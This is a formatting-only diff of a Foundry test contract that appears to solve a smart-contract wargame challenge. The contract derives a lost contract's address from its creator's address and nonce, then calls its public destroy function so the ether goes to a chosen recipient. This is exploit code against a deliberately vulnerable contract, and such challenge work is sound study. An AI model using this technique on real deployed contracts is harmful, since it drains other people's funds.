@@ -16,28 +16,25 @@ contract Attacktargetaritan is Test {
     }
 
     function getAddress() internal view returns (address) {
-        return
-            address(
-                uint160(
-                    uint256(
-                        keccak256(
-                            abi.encodePacked(
-                                bytes1(0xd6), // rlp encoding
-                                bytes1(0x94), // rlp encod
-                                address(target), // target address
-                                bytes1(0x01) // post EIP161 nonces start at 1
-                            )
+        return address(
+            uint160(
+                uint256(
+                    keccak256(
+                        abi.encodePacked(
+                            bytes1(0xd6), // rlp encoding
+                            bytes1(0x94), // rlp encod
+                            address(target), // target address
+                            bytes1(0x01) // post EIP161 nonces start at 1
                         )
                     )
                 )
-            );
+            )
+        );
     }
 
     function testSolidityRecovery() public {
         // compute the address
-        (bool success, ) = getAddress().call(
-            abi.encodeCall(SimpleToken.destroy, (hombre))
-        );
+        (bool success,) = getAddress().call(abi.encodeCall(SimpleToken.destroy, (hombre)));
 
         assertEq(success, true, "call to the address failed");
         assertEq(hombre.balance, 0.01 ether);
